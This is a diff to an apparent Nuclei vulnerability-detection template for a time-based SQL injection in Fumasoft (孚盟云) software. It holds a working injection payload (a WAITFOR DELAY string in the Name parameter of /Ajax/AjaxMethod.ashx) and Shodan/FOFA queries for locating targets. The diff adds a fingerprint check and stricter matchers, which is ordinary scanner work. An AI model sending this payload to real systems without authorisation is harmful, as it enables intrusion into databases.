@@ -22,9 +22,22 @@ info:
     max-request: 1
     shodan-query: title:"孚盟云 "
     fofa-query: title="孚盟云 "
-  tags: fumasoft,sqli
+  tags: time-based-sqli,fumasoft,sqli
+
+flow: http(1) && http(2)
 
 http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(response, "孚盟")'
+        internal: true
+
   - raw:
       - |
         @timeout: 30s
@@ -36,6 +49,7 @@ http:
         GET /Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
         Host: {{Hostname}}
 
+    stop-at-first-match: true
     matchers-condition: or
     matchers:
       - type: dsl
@@ -49,6 +63,8 @@ http:
         name: time-based
         dsl:
           - 'duration_2>=6'
-          - 'contains_all(response_2, "0", "text/plain")'
+          - 'len(body_2) == 1'
+          - 'regex("^0$", body_2)'
+          - 'contains(content_type_2, "text/plain")'
         condition: and
-# digest: 4a0a004730450220093e0ab367ad9bd0fb821ab8a76348d35fdccfcdceb731ab028dd494d3e58ba702210082b1ed2a0e9f9d628c6d0d16a48f346fecd912251491470e4926509bf6fb6baa:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a00473045022100e7887652ccb785d438a8c8e7266879dab9c558c4146b90c181656aec58edc62102200e5aa9dcd9f56fbd0d1b53f9ebc95a1441b46aa9065d8e1c9ccec74608bdae25:922c64590222798bb761d5b6d8e72950
